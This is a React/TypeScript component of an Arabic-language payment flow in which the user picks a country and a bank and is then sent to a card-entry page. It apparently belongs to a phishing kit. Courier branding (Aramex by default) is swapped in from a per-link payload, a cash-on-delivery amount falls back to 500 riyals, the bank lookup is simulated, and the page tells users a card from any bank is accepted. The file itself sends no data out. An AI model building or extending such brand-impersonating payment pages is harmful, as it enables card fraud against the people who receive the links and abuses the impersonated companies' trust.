import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { Building2, ChevronLeft, ArrowLeft, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { COUNTRIES, getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [selectedCountry, setSelectedCountry] = useState<string>("");
  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  const [step, setStep] = useState<"country" | "bank">("country");
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  // Load banks when country is selected
  useEffect(() => {
    if (selectedCountry && step === "bank") {
      setLoadingBanks(true);
      // Simulate API call
      setTimeout(() => {
        const countryBanks = getBanksByCountry(selectedCountry);
        setBanks(countryBanks);
        setLoadingBanks(false);
      }, 300);
    }
  }, [selectedCountry, step]);
  
  const handleCountrySelect = (countryCode: string) => {
    setSelectedCountry(countryCode);
    setSelectedBank("");
    setStep("bank");
  };
  
  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId);
  };
  
  const handleSkipBankSelection = () => {
    // Store selection in sessionStorage
    sessionStorage.setItem('selectedCountry', selectedCountry);
    sessionStorage.setItem('selectedBank', 'skipped');
    
    toast({
      title: "متابعة بدون اختيار البنك",
      description: "يمكنك إدخال بيانات البطاقة مباشرة",
    });
    
    navigate(`/pay/${id}/card-input`);
  };
  
  const handleContinue = () => {
    if (step === "bank" && selectedBank) {
      // Store selection in sessionStorage
      sessionStorage.setItem('selectedCountry', selectedCountry);
      sessionStorage.setItem('selectedBank', selectedBank);
      
      navigate(`/pay/${id}/card-input`);
    }
  };
  
  const handleBack = () => {
    if (step === "bank") {
      setStep("country");
      setSelectedBank("");
      setBanks([]);
    }
  };
  
  return (
    <div 
      className="min-h-screen py-4 sm:py-12" 
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
      }}
    >
      <div className="container mx-auto px-3 sm:px-4">
        <div className="max-w-2xl mx-auto">
          {/* Company Header Image */}
          {branding.ogImage && (
            <div className="mb-4 sm:mb-6 rounded-xl overflow-hidden shadow-lg">
              <img 
                src={branding.ogImage} 
                alt={serviceName}
                className="w-full h-32 sm:h-48 object-cover"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Company Logo */}
          {branding.logo && (
            <div className="text-center mb-4 sm:mb-6">
              <img 
                src={branding.logo} 
                alt={serviceName}
                className="h-10 sm:h-12 mx-auto"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Amount Badge */}
          <div className="text-center mb-3 sm:mb-6">
            <Badge 
              className="text-sm sm:text-lg px-4 py-2 sm:px-6 sm:py-3 text-white font-bold"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
              }}
            >
              المبلغ: {formattedAmount}
            </Badge>
          </div>
          
          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
            {/* Header with Back Button */}
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3">
                <div 
                  className="w-12 h-12 rounded-xl flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                  }}
                >
                  <Building2 className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-xl sm:text-2xl font-bold">
                    {step === "country" ? "اختر الدولة" : "اختر البنك"}
                  </h1>
                  <p className="text-sm text-muted-foreground">
                    {step === "country" ? "حدد دولتك" : "اختياري - يمكنك التخطي"}
                  </p>
                </div>
              </div>
              
              {step === "bank" && (
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={handleBack}
                  className="flex items-center gap-1"
                >
                  <ChevronLeft className="w-4 h-4" />
                  <span>رجوع</span>
                </Button>
              )}
            </div>
            
            {/* Country Selection */}
            {step === "country" && (
              <div className="space-y-3">
                {COUNTRIES.map((country) => (
                  <Button
                    key={country.code}
                    variant={selectedCountry === country.code ? "default" : "outline"}
                    className="w-full h-auto p-4 justify-start text-right transition-all hover:shadow-md"
                    onClick={() => handleCountrySelect(country.code)}
                    style={
                      selectedCountry === country.code
                        ? {
                            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                            color: 'white'
                          }
                        : undefined
                    }
                  >
                    <div className="flex items-center gap-3 w-full">
                      <span className="text-3xl">{country.flag}</span>
                      <div className="flex-1 text-right">
                        <p className="font-bold text-base">{country.nameAr}</p>
                        <p className="text-xs opacity-80">{country.name}</p>
                      </div>
                      {selectedCountry === country.code && (
                        <ChevronLeft className="w-5 h-5 mr-2" />
                      )}
                    </div>
                  </Button>
                ))}
              </div>
            )}
            
            {/* Bank Selection */}
            {step === "bank" && (
              <div className="space-y-4">
                {loadingBanks ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="w-8 h-8 animate-spin" style={{ color: branding.colors.primary }} />
                  </div>
                ) : (
                  <>
                    {/* Selected Country Info */}
                    <div 
                      className="p-3 rounded-lg mb-4 flex items-center gap-3"
                      style={{
                        background: `${branding.colors.primary}10`,
                        border: `1px solid ${branding.colors.primary}30`
                      }}
                    >
                      <span className="text-2xl">{getCountryByCode(selectedCountry)?.flag}</span>
                      <p className="text-sm font-semibold">
                        {getCountryByCode(selectedCountry)?.nameAr}
                      </p>
                    </div>
                    
                    {/* Banks Grid */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      {banks.map((bank) => (
                        <Button
                          key={bank.id}
                          variant={selectedBank === bank.id ? "default" : "outline"}
                          className="h-auto p-4 justify-start text-right transition-all hover:shadow-md"
                          onClick={() => handleBankSelect(bank.id)}
                          style={
                            selectedBank === bank.id
                              ? {
                                  background: bank.color || branding.colors.primary,
                                  color: 'white',
                                  borderColor: bank.color || branding.colors.primary
                                }
                              : {
                                  borderColor: `${bank.color || branding.colors.primary}40`
                                }
                          }
                        >
                          <div className="flex items-center gap-2 w-full">
                            <Building2 
                              className="w-5 h-5 flex-shrink-0" 
                              style={{ 
                                color: selectedBank === bank.id ? 'white' : (bank.color || branding.colors.primary) 
                              }}
                            />
                            <div className="flex-1 text-right">
                              <p className="font-bold text-sm">{bank.nameAr}</p>
                              <p className="text-xs opacity-70">{bank.name}</p>
                            </div>
                          </div>
                        </Button>
                      ))}
                    </div>
                    
                    {/* Action Buttons */}
                    <div className="space-y-3 mt-6 pt-6 border-t">
                      {selectedBank ? (
                        <Button
                          size="lg"
                          className="w-full text-lg py-6 text-white font-bold transition-all hover:shadow-lg"
                          onClick={handleContinue}
                          style={{
                            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                          }}
                        >
                          <span className="ml-2">متابعة مع {banks.find(b => b.id === selectedBank)?.nameAr}</span>
                          <ArrowLeft className="w-5 h-5 mr-2" />
                        </Button>
                      ) : null}
                      
                      <Button
                        variant="ghost"
                        size="lg"
                        className="w-full text-base py-5"
                        onClick={handleSkipBankSelection}
                        style={{ color: branding.colors.primary }}
                      >
                        تخطي اختيار البنك والمتابعة
                      </Button>
                    </div>
                    
                    {/* Info Note */}
                    <div className="bg-muted/50 rounded-lg p-3 mt-4">
                      <p className="text-xs text-muted-foreground text-center">
                        ملاحظة: يمكنك إدخال بيانات بطاقة من أي بنك، حتى لو كانت مختلفة عن البنك الذي اخترته
                      </p>
                    </div>
                  </>
                )}
              </div>
            )}
          </Card>
        </div>
      </div>
    </div>
  );
};

export default PaymentBankSelector;
